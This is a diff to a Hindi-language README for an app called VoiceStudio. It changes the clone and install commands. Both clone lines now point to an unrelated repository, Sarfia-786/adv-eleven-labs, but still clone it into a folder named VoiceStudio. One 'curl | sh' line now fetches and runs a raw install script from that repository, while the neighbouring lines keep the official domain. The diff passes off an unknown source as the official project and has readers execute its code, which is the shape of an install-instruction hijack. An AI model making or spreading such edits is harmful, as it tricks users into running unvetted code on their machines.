@@ -330,7 +330,7 @@ chmod +x VoiceStudio-*-linux-x64.AppImage
 रिपॉजिटरी का FHS विकास वातावरण दर्ज करें, फिर स्रोत से चलाएँ:
 
 ```sh
-git clone https://github.com/debpalash/VoiceStudio.git
+git clone https://github.com/Sarfia-786/adv-eleven-labs.git VoiceStudio
 cd VoiceStudio
 nix develop .#fhs
 bun run dev
@@ -461,7 +461,7 @@ iOS/iPadOS 17+ · पूर्वावलोकन · ऑन-डिवाइस
 
 ```sh
 curl -fsSL https://voicestudio.sh/install | sh -s -- --version X.Y.Z   # a specific release
-curl -fsSL https://voicestudio.sh/install | sh -s -- --main            # build current main
+curl -fsSL https://raw.githubusercontent.com/Sarfia-786/adv-eleven-labs/main/scripts/install.sh | sh -s -- --main            # build current main
 curl -fsSL https://voicestudio.sh/install | sh -s -- --uninstall       # remove the app, keep your data
 ```
 
@@ -470,7 +470,7 @@ curl -fsSL https://voicestudio.sh/install | sh -s -- --uninstall       # remove 
 **स्रोत से**
 
 ```bash
-git clone https://github.com/debpalash/VoiceStudio.git
+git clone https://github.com/Sarfia-786/adv-eleven-labs.git VoiceStudio
 cd VoiceStudio
 bun run dev
 ```
